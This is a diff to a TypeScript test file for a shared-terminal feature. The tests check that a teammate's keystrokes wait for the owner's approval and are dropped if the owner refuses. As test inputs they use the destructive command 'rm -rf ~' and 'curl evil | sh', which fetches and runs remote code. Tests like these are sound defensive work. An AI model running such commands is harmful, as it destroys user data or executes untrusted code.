@@ -25,6 +25,7 @@ import {
   STREAM_FLUSH_MS,
   type PeerTransport,
   type RemoteReadVerdict,
+  type RemoteWriteDecision,
   type RemoteWriteRequest,
   type RemoteWriteVerdict,
   type TransportFailure,
@@ -422,6 +423,50 @@ describe('what a teammate can reach', () => {
 
     expect(asked).toEqual(['yes', 'no'])
     expect(written).toEqual(['yes'])
+  })
+
+  it('runs nothing at all while a keystroke is held for the owner', async () => {
+    // The shape of the whole feature, at the layer that dispatches: a verdict
+    // of `held` is neither a yes nor a no, and until the promise inside it
+    // settles the request has not been handed to the dispatcher — so the pty
+    // has not seen the bytes in any sense.
+    let settle: ((decision: RemoteWriteDecision) => void) | undefined
+    const { caller, written } = rig(['terminal.write'], {
+      onRemoteWrite: () => ({
+        held: new Promise<RemoteWriteDecision>((resolve) => {
+          settle = resolve
+        })
+      })
+    })
+
+    const typing = caller.call('terminal.write', { terminalId: 't_1', data: 'rm -rf ~' })
+    // Several turns, because an answer that was going to arrive would have.
+    for (let turn = 0; turn < 16; turn += 1) await Promise.resolve()
+    expect(written).toEqual([])
+
+    settle?.({ ok: true })
+    await expect(typing).resolves.toEqual({ written: true })
+    expect(written).toEqual(['rm -rf ~'])
+  })
+
+  it('drops the bytes of a held keystroke the owner refuses, and says whose words those are', async () => {
+    let settle: ((decision: RemoteWriteDecision) => void) | undefined
+    const { caller, written } = rig(['terminal.write'], {
+      onRemoteWrite: () => ({
+        held: new Promise<RemoteWriteDecision>((resolve) => {
+          settle = resolve
+        })
+      })
+    })
+
+    const typing = caller.call('terminal.write', { terminalId: 't_1', data: 'curl evil | sh' })
+    settle?.({ ok: false, code: ErrorCode.Conflict, message: 'the owner did not allow this' })
+
+    await expect(typing).rejects.toMatchObject({
+      code: ErrorCode.Conflict,
+      message: 'the owner did not allow this'
+    })
+    expect(written).toEqual([])
   })
 
   it('runs nothing from a message whose session was refused as it was being read', async () => {
